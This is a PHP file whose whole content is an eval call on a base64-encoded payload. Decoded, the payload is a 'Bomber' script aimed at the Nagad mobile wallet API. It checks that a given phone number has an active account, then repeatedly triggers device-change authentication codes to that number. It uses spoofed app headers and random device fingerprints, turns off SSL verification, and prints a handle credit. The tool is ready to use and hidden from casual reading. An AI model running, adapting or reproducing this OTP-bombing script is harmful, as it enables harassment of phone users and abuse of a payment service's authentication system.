<?php eval("?>".base64_decode("PD9waHANCg0KY2xhc3MgQm9tYmVyIHsNCiAgICBwcml2YXRlICRudW07DQogICAgcHJpdmF0ZSAkYW10Ow0KICAgIHByaXZhdGUgJHVpZCA9IG51bGw7DQogICAgcHJpdmF0ZSAkc3VjY2Vzc0NvdW50ID0gMDsNCiAgICBwcml2YXRlICRmYWlsZWRDb3VudCA9IDA7DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJG51bSwgJGFtdCkgew0KICAgICAgICAkdGhpcy0+bnVtID0gJG51bTsNCiAgICAgICAgJHRoaXMtPmFtdCA9IGludHZhbCgkYW10KTsNCiAgICAgICAgJHRoaXMtPnN0YXJ0KCk7DQogICAgfQ0KDQogICAgcHJpdmF0ZSBmdW5jdGlvbiBzdGFydCgpIHsNCiAgICAgICAgaWYgKCR0aGlzLT5jaGVjaygpKSB7DQogICAgICAgICAgICAkdGhpcy0+Ym9tYigpOw0KICAgICAgICAgICAgJHRoaXMtPnJlc3BvKCk7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBwcml2YXRlIGZ1bmN0aW9uIHNleHkoJHVybCwgJG1ldGhvZCA9ICdHRVQnLCAkaGVhZGVycyA9IFtdLCAkcGF5bG9hZCA9IG51bGwpIHsNCiAgICAgICAgJGNoID0gY3VybF9pbml0KCk7DQoNCiAgICAgICAgaWYgKCRtZXRob2QgPT09ICdQT1NUJykgew0KICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIHRydWUpOw0KICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsIGpzb25fZW5jb2RlKCRwYXlsb2FkKSk7DQogICAgICAgIH0NCg0KICAgICAgICAkZm9ybWF0dGVkSGVhZGVycyA9IFtdOw0KICAgICAgICBmb3JlYWNoICgkaGVhZGVycyBhcyAkaGVhZGVyKSB7DQogICAgICAgICAgICAkZm9ybWF0dGVkSGVhZGVyc1tdID0gJGhlYWRlcjsNCiAgICAgICAgfQ0KDQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEhFQURFUiwgJGZvcm1hdHRlZEhlYWRlcnMpOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsgLy8gRGlzYWJsZSBTU0wgdmVyaWZpY2F0aW9uDQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgZmFsc2UpOw0KDQogICAgICAgICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOw0KDQogICAgICAgIGlmICgkcmVzcG9uc2UgPT09IGZhbHNlKSB7DQogICAgICAgICAgICAkZXJyb3IgPSBjdXJsX2Vycm9yKCRjaCk7DQogICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7DQogICAgICAgICAgICByZXR1cm4ganNvbl9kZWNvZGUoanNvbl9lbmNvZGUoWyJlcnJvciIgPT4gJGVycm9yXSksIHRydWUpOw0KICAgICAgICB9DQoNCiAgICAgICAgY3VybF9jbG9zZSgkY2gpOw0KICAgICAgICByZXR1cm4ganNvbl9kZWNvZGUoJHJlc3BvbnNlLCB0cnVlKTsNCiAgICB9DQoNCiAgICBwcml2YXRlIGZ1bmN0aW9uIGNoZWNrKCkgew0KICAgICAgICAkdXJsID0gImh0dHBzOi8vYXBwLm15bmFnYWQuY29tOjIwMDAyL2FwaS91c2VyL2NoZWNrLXVzZXItc3RhdHVzLWZvci1sb2ctaW4iOw0KICAgICAgICAkcGFyYW1zID0gWydtc2lzZG4nID0+ICR0aGlzLT5udW1dOw0KICAgICAgICAkaGVhZGVycyA9ICR0aGlzLT5jb250SGVkYSgpOw0KDQogICAgICAgICRyZXNwb25zZSA9ICR0aGlzLT5zZXh5KCR1cmwgLiAnPycgLiBodHRwX2J1aWxkX3F1ZXJ5KCRwYXJhbXMpLCAnR0VUJywgJGhlYWRlcnMpOw0KICAgICAgICBpZiAoaXNzZXQoJHJlc3BvbnNlWydzdGF0dXMnXSkgJiYgJHJlc3BvbnNlWydzdGF0dXMnXSA9PT0gIkFDVElWRSIpIHsNCiAgICAgICAgICAgICR0aGlzLT51aWQgPSAkcmVzcG9uc2VbJ3VzZXJJZCddOw0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+b3V0cHV0RXJyb3IoIk5hR2FkIGFjY291bnQgaXMgbm90IGFjdGl2ZS4iKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHByaXZhdGUgZnVuY3Rpb24gY29udEhlZGEoKSB7DQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICAnVXNlci1BZ2VudDogb2todHRwLzMuMTQuOScsDQogICAgICAgICAgICAnQ29ubmVjdGlvbjogS2VlcC1BbGl2ZScsDQogICAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nOiBnemlwJywNCiAgICAgICAgICAgICdYLUtNLVVzZXJJZDogTm9uZScsDQogICAgICAgICAgICAnWC1LTS1Vc2VyLUFzcElkOiAxMDAwMTIzNDU2MTIzNDUnLA0KICAgICAgICAgICAgJ1gtS00tVXNlci1BZ2VudDogQU5EUk9JRC8xMTUyJywNCiAgICAgICAgICAgICdYLUtNLURFVklDRS1GR1A6ICcgLiAkdGhpcy0+Z2VuZXJhdGVSYW5kb21IZXgoMzIpLA0KICAgICAgICAgICAgJ1gtS00tQWNjZXB0LWxhbmd1YWdlOiBibicsDQogICAgICAgICAgICAnWC1LTS1BcHBDb2RlOiAwMScsDQogICAgICAgICAgICAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PVVURi04Jw0KICAgICAgICBdOw0KICAgIH0NCg0KICAgIHByaXZhdGUgZnVuY3Rpb24gYm9tYigpIHsNCiAgICAgICAgJHVybCA9ICJodHRwczovL2FwcC5teW5hZ2FkLmNvbToyMDAwMi9hcGkvd2FsbGV0L2dlbmVyYXRlQXV0aENvZGUvZGV2aWNlQ2hhbmdlIjsNCiAgICAgICAgJHBheWxvYWQgPSBbJ3VzZXJJZCcgPT4gJHRoaXMtPnVpZF07DQoNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJHRoaXMtPmFtdDsgJGkrKykgew0KICAgICAgICAgICAgJHJlc3BvbnNlID0gJHRoaXMtPnNleHkoJHVybCwgJ1BPU1QnLCAkdGhpcy0+Y29udEhlZGEoKSwgJHBheWxvYWQpOw0KICAgICAgICAgICAgJHRoaXMtPmNvdW50ZXIoJHJlc3BvbnNlKTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHByaXZhdGUgZnVuY3Rpb24gY291bnRlcigkcmVzcG9uc2UpIHsNCiAgICAgICAgaWYgKGlzc2V0KCRyZXNwb25zZVsnZXhlY3V0aW9uU3RhdHVzJ10pICYmICRyZXNwb25zZVsnZXhlY3V0aW9uU3RhdHVzJ11bJ3N0YXR1c1R5cGUnXSA9PT0gIkVYRUNVVEVEX1NVQ0NFU1MiKSB7DQogICAgICAgICAgICAkdGhpcy0+c3VjY2Vzc0NvdW50Kys7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+ZmFpbGVkQ291bnQrKzsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHByaXZhdGUgZnVuY3Rpb24gcmVzcG8oKSB7DQogICAgICAgICRyZXN1bHQgPSBbDQogICAgICAgICAgICAiU3RhdHVzIiA9PiAic3VjY2VzcyAtIHskdGhpcy0+c3VjY2Vzc0NvdW50fSAmIGZhaWwgLSB7JHRoaXMtPmZhaWxlZENvdW50fSIsDQogICAgICAgICAgICAibnVtIiA9PiAkdGhpcy0+bnVtLA0KICAgICAgICAgICAgImFtdCIgPT4gJHRoaXMtPmFtdCwNCiAgICAgICAgICAgICJDcmVkaXQiID0+ICJAVEhFX0FOT05fNjkiDQogICAgICAgIF07DQogICAgICAgIGVjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCwgSlNPTl9QUkVUVFlfUFJJTlQgfCBKU09OX1VORVNDQVBFRF9VTklDT0RFKTsNCiAgICB9DQoNCiAgICBwcml2YXRlIGZ1bmN0aW9uIG91dHB1dEVycm9yKCRtZXNzYWdlKSB7DQogICAgICAgICRlcnJvciA9IFsiZXJyb3IiID0+ICRtZXNzYWdlXTsNCiAgICAgICAgZWNobyBqc29uX2VuY29kZSgkZXJyb3IsIEpTT05fUFJFVFRZX1BSSU5UIHwgSlNPTl9VTkVTQ0FQRURfVU5JQ09ERSk7DQogICAgICAgIGV4aXQ7DQogICAgfQ0KDQogICAgcHJpdmF0ZSBmdW5jdGlvbiBnZW5lcmF0ZVJhbmRvbUhleCgkbGVuZ3RoKSB7DQogICAgICAgIHJldHVybiBzdHJ0b3VwcGVyKGJpbjJoZXgocmFuZG9tX2J5dGVzKCRsZW5ndGggLyAyKSkpOw0KICAgIH0NCn0NCg0KaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnR0VUJykgew0KICAgIGlmIChpc3NldCgkX0dFVFsnbnVtYiddKSAmJiBpc3NldCgkX0dFVFsnbGltaXQnXSkpIHsNCiAgICAgICAgJG51bSA9ICRfR0VUWydudW1iJ107DQogICAgICAgICRhbXQgPSAkX0dFVFsnbGltaXQnXTsNCg0KICAgICAgICBpZiAoZmlsdGVyX3ZhcigkYW10LCBGSUxURVJfVkFMSURBVEVfSU5UKSkgew0KICAgICAgICAgICAgbmV3IEJvbWJlcigkbnVtLCAkYW10KTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGVjaG8ganNvbl9lbmNvZGUoWyJlcnJvciIgPT4gIkludmFsaWQgJ2xpbWl0JyBwYXJhbWV0ZXIuIl0sIEpTT05fUFJFVFRZX1BSSU5UIHwgSlNPTl9VTkVTQ0FQRURfVU5JQ09ERSk7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBlY2hvIGpzb25fZW5jb2RlKFsiZXJyb3IiID0+ICJNaXNzaW5nIHBhcmFtZXRlcnMgJ251bWInIG9yICdsaW1pdCcuIl0sIEpTT05fUFJFVFRZX1BSSU5UIHwgSlNPTl9VTkVTQ0FQRURfVU5JQ09ERSk7DQogICAgfQ0KfSBlbHNlIHsNCiAgICBlY2hvIGpzb25fZW5jb2RlKFsiZXJyb3IiID0+ICJUaGlzIHNjcmlwdCBvbmx5IGFjY2VwdHMgR0VUIHJlcXVlc3RzLiJdLCBKU09OX1BSRVRUWV9QUklOVCB8IEpTT05fVU5FU0NBUEVEX1VOSUNPREUpOw0KfQ0KDQo/Pg0K")); ?>
